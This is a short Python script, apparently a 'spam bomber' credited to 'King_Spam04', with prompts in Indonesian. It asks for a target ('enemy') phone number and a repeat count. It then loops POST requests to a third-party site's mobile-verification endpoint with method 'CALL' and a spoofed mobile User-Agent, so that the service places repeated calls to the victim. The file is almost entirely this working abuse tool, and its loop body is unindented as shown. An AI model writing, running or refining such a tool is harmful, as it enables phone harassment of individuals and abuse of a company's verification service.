#modules
import sys,time,os,requests
from time import sleep

#tampilan
sleep (1)
print('halo')
sleep (1)
os.system('clear')
sleep (1)
banner = '''

(•) ================≠===========(•)
      Author : King_Spam04
      yt : KingSpam04
(•) ============================(•)'''
sleep (1)
print(banner)
tar = input('masukan Nomor musuh --> ')
sleep (1)
jm = int(input('masukan jumlah spam --> '))

url = "https://id.jagreward.com/member/verify-mobile/"
ua = { 'Host': "id.jagreward.com", 'Connection': "keep-alive", 'User-Agent': 'Mozilla/5.0 ( Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36'}
dat = {"method": "CALL","countryCode": "id",}

for i in range(jm):
send = requests.post(url+tar, headers=ua, data=dat)
print(" [•] Status >>> ",(send.json()["message"]))